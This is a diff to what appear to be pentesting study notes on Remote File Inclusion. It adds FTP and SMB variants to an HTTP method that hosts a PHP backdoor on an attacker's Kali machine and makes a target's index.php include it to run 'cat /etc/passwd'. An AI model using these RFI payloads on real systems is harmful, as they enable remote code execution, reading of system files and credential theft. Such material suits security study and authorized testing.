@@ -27,6 +27,8 @@ another php webshell example
 ## Demonstration of RFI Attacks
 
 #### Enumerating
+You may need to view page source to see output in a legible manner
+
 HTTP Version:
 ```bash
 # host server
@@ -35,10 +37,23 @@ python3 -m http.server 80
 # visit
 http://<target>.com/index.php?view=http://<kali_ip>/simple-backdoor.php?cmd=cat+/etc/passwd
 ```
-You may need to view page source to see output in a legible manner
 
-See [[LFI Path Traversal]] if you can get to this point
+FTP version: (in case WAF blocks http)
+```bash
+sudo python -m pyftpdlib -p 21  # host ftp server
 
+http://<target>.com/index.php?view=ftp://<kali_ip>/simple-backdoor.php?cmd=cat+/etc/passwd
+```
+
+SMB Version:
+```bash
+impacket-smbserver -smb2support share $(pwd)  # host SMB server
+
+http://<target>.com/index.php?view=\\<kali_ip>\share\simple-backdoor.php?cmd=cat+/etc/passwd
+```
+
+
+See [[Methodology/Web App/File Inclusion/Local File Inclusion (LFI)]] if you can get to this point
 #### Stealing Hashes
 We can potentially intercept user hashes if RFI is possible
 
